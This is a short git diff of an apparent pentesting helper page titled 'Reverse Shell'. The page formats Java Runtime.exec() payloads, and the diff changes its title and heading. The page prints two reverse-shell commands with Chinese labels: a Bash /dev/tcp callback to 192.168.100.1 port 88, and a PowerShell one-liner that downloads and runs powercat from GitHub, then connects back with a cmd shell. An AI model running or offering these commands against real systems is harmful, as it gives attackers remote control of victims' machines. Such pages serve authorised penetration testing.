@@ -1,13 +1,13 @@
 ---
 layout: page
-title: java.lang.Runtime.exec() Payload
+title: Reverse Shell
 ---
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 </head>
 <body>
-<!-- <h1>java.lang.Runtime.exec() Payload</h1> -->
+<h1>java.lang.Runtime.exec() Payload</h1> <!-- 注释 -->
 <input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked=""><label for="bash">Bash</label>
 <input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"><label for="powershell">PowerShell</label>
 <input type="radio" id="python" name="option" value="python" onclick="processInput();"><label for="python">Python</label>
@@ -48,10 +48,8 @@ taInput.addEventListener('input', processInput, false);
 
 <b>Bash反弹命令：</b>
 <p style="color:red;">bash -i &gt;&amp; /dev/tcp/192.168.100.1/88 0&gt;&amp;1</p>
-<br>
 <b>PowerShell反弹命令：</b>
 <p style="color:red;">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.100.1 -p 88 -e cmd</p>
-<br>
 </body>
 </html>
 
